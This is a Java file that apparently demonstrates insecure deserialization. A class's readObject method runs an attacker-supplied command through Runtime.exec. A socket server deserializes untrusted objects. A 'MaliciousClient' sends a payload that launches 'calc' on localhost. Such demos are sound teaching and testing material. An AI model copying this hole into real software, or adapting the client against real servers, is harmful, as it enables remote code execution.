import java.io.*;
import java.net.*;

class SensorData implements Serializable {
    private String deviceId;
    private double temperature;
    private String command;

    public String getDeviceId() { return deviceId; }
    public void setDeviceId(String deviceId) { this.deviceId = deviceId; }
    public double getTemperature() { return temperature; }
    public void setTemperature(double temperature) { this.temperature = temperature; }
    public String getCommand() { return command; }
    public void setCommand(String command) { this.command = command; }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        if (command != null) {
            try {
                Runtime.getRuntime().exec(command);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}

public class VulnerableServer {
    public static void main(String[] args) {
        try (ServerSocket serverSocket = new ServerSocket(12345)) {
            System.out.println("Server is listening on port 12345");
            while (true) {
                Socket socket = serverSocket.accept();
                ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                SensorData data = (SensorData) ois.readObject();
                System.out.println("Received data from " + data.getDeviceId());
                System.out.println("Temperature: " + data.getTemperature());
                ois.close();
                socket.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

class MaliciousClient {
    public static void main(String[] args) {
        try (Socket socket = new Socket("localhost", 12345)) {
            ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
            SensorData data = new SensorData();
            data.setDeviceId("malicious-device");
            data.setTemperature(666);
            data.setCommand("calc");
            oos.writeObject(data);
            oos.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}